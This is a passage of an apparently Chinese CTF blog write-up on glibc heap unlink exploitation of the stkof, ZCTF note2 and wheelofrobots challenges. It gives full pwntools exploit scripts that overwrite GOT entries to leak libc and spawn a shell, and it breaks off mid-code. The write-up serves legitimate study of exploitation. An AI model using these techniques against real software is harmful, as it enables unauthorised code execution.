<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x20f7560-0x30</span><br><span class="line">0x20f7530:	0x0000000000000000	0x0000000000000041 <span class="comment">#chunk2</span></span><br><span class="line">0x20f7540:	0x0000000000000000	0x0000000000000030 <span class="comment">#p</span></span><br><span class="line">0x20f7550:	0x0000000000602138	0x0000000000602140</span><br><span class="line">0x20f7560:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x20f7570:	0x0000000000000030	0x0000000000000090 <span class="comment">#chunk3</span></span><br><span class="line">0x20f7580:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f7590:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f75a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f75b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f75c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>这里已经溢出覆盖掉chunk3的size了<br>其实unlink已经说过一次了，</p>
<ul>
<li>首先，第一步要过掉unlink的size检测，覆盖chunk3的pre_size为fake_chunk大小</li>
<li>其次chunk3的insue位要为0，标志前面一个堆块未在使用当中</li>
<li>然后关键点就是伪造fd跟bk了</li>
<li>在第一点中我将ptr设置为global+0x10意思就是第二块堆块地址，这就是存放p的地方 </li>
<li>unlink第一步 FD = p-&gt;fd = ptr-0x18</li>
<li>unlink第二步 BK=p-&gt;bk = ptr-0x10</li>
<li>unlink第三步 判断FD-&gt;bk == p &amp;&amp; BK-&gt;fd == p ?</li>
<li>过了检验后</li>
<li>FD-&gt;bk = * (ptr-0x18 + 0x18 )= BK = ptr -0x10</li>
<li>BK-&gt;fd = * (ptr-0x10+0x10) = FD = ptr-0x18<br>最终结果就是*ptr = ptr-0x18，而ptr是0x0000000000602150故最终就是将global+0x10处的值改为0x602138<br>然后我们在编辑第二块的时候实际上就是编辑0x602138处，也就是global-0x8处</li>
</ul>
<ol start="3">
<li>泄露地址</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(free_got)+p64(puts_got) + <span class="string">'a'</span>*<span class="number">8</span> + p64(atoi_got) <span class="comment">#这里对应的是第一块堆块，第二块，第三块和第四块</span></span><br><span class="line">fill(<span class="number">2</span>, payload) </span><br><span class="line">fill(<span class="number">1</span>,p64(puts_plt))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">io.success(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br></pre></td></tr></table></figure>
<p>没什么好说的啊，覆写got表为put泄露地址</p>
<ol start="4">
<li>最后我修改atoi为system，因为输入的会经过atoi转换，所以输入的就是system参数</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(io)</span><br><span class="line">fill(<span class="number">4</span>, p64(system_addr))</span><br><span class="line">io.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br></pre></td></tr></table></figure>




<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'stkof'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'stkof'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.sendline(str(len(content)))</span><br><span class="line">    io.sendline(content)</span><br><span class="line">    io.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">    ptr = <span class="number">0x0000000000602140</span>+<span class="number">0x10</span></span><br><span class="line">    <span class="comment">#for buffer</span></span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x100</span>) <span class="comment">#idx1   </span></span><br><span class="line">    alloc(<span class="number">0x30</span>) <span class="comment">#idx2</span></span><br><span class="line">    alloc(<span class="number">0x80</span>) <span class="comment">#idx3</span></span><br><span class="line">    alloc(<span class="number">0x30</span>) <span class="comment">#idx4</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    fill(<span class="number">2</span>, payload)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">    payload += p64(free_got)+p64(puts_got) + <span class="string">'a'</span>*<span class="number">8</span> + p64(atoi_got)</span><br><span class="line">    fill(<span class="number">2</span>, payload) </span><br><span class="line">    fill(<span class="number">1</span>,p64(puts_plt))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'FAIL\n'</span>)</span><br><span class="line">    puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    io.success(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br><span class="line">    </span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    fill(<span class="number">4</span>, p64(system_addr))</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">ctf-wiki讲解</a></p>
<p>我只讲差异，里面有的我就不讲了，我只发现了这个漏洞点<br>程序在每次编辑 note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有设置为 NULL。<br>然后我并不会利用这个，本来想利用chunk extends上一节学的，发觉他free后的大小不怎么对，到时看下源码吧，他free后的chunk大小不是合并后的大小，最后看到了大佬讲解的那个0，然后通过-1转成无符号整数，这个我自己查看的时候看不出</p>
<h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>第一步构造unlink，原理上一节弄过了，所以感觉这次顺畅好多</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="number">0x0000000000602120</span> </span><br><span class="line">first()</span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa0</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) </span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'a'</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, payload)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>unlink过后修改ptr[0]指针，指向atoi的got表，泄露地址，为什么指向atoi?为后面做准备</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, payload) </span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">"TheNewContents:Edit note success!\n"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Content is "</span>)</span><br><span class="line">atoi_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"atoi_addr: 0x%x"</span> % atoi_addr)</span><br><span class="line">libc_base = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br></pre></td></tr></table></figure>

<p>getshell,因为此时第一块堆块还指向atoi的got表，所以此时编辑下，就可以覆写got表了，输入的时候会将输入串atoi，所以就成为参数了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get_shell</span></span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, p64(system_addr))</span><br><span class="line">io.sendline(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure>



<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'note2'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'note2'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote</span><span class="params">(idx, choice, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shownote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Input your name:\n"</span>, <span class="string">"greenhand"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input your address:\n"</span>, <span class="string">"greenhand"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    ptr = <span class="number">0x0000000000602120</span> </span><br><span class="line">    first()</span><br><span class="line">    <span class="comment"># unlink</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa0</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) </span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'a'</span>)</span><br><span class="line">    newnote(<span class="number">0x80</span>, payload)</span><br><span class="line">    newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>)</span><br><span class="line">    newnote(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    newnote(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line">    editnote(<span class="number">0</span>, <span class="number">1</span>, payload) </span><br><span class="line">    shownote(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"TheNewContents:Edit note success!\n"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Content is "</span>)</span><br><span class="line">    atoi_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"atoi_addr: 0x%x"</span> % atoi_addr)</span><br><span class="line">    libc_base = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#get_shell</span></span><br><span class="line">    editnote(<span class="number">0</span>, <span class="number">1</span>, p64(system_addr))</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="2017-insomni’hack-wheelofrobots"><a href="#2017-insomni’hack-wheelofrobots" class="headerlink" title="2017 insomni’hack wheelofrobots"></a>2017 insomni’hack wheelofrobots</h2><p>这道题难点我觉得在于代码长了点，然后漏洞点难找了点，其余还好，我自己分析的时候又是一头雾水，只看出free的时候没置空，然后还有的是在change部分，他代销有的居然达到了0x9C40uLL，这里我觉得也是一个点，off-by-one真没看出来</p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">ctf-wiki讲解</a></p>
<p>我不在分析功能以及漏洞点分析，这次我自己没分析出来，只讲下漏洞利用过程以及过程中踩到的坑</p>
<h3 id="漏洞利用过程-2"><a href="#漏洞利用过程-2" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol>
<li>准备部分</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size=<span class="number">0</span>)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Bender's intelligence: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Robot Devil's cruelty: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Destructor's powerful: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    io.sendafter(<span class="string">"Robot's name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_robot</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">off_by_one</span><span class="params">(byte)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"9999"</span> + byte)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr1, addr2)</span>:</span></span><br><span class="line">    change(<span class="number">1</span>, p64(addr1))</span><br><span class="line">    change(<span class="number">6</span>, p64(addr2))</span><br></pre></td></tr></table></figure>

<p><strong>注意：这里change是sendafter不是sendline，因为sendline会发送多一个\n破坏地址</strong></p>
<ol start="2">
<li>off-by-one溢出修改部分</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">off_by_one(<span class="string">'\x01'</span>)</span><br><span class="line"><span class="comment"># change fd pointer</span></span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x0000000000603138</span>))</span><br><span class="line">off_by_one(<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pass the fastbin check size=0x20</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#now 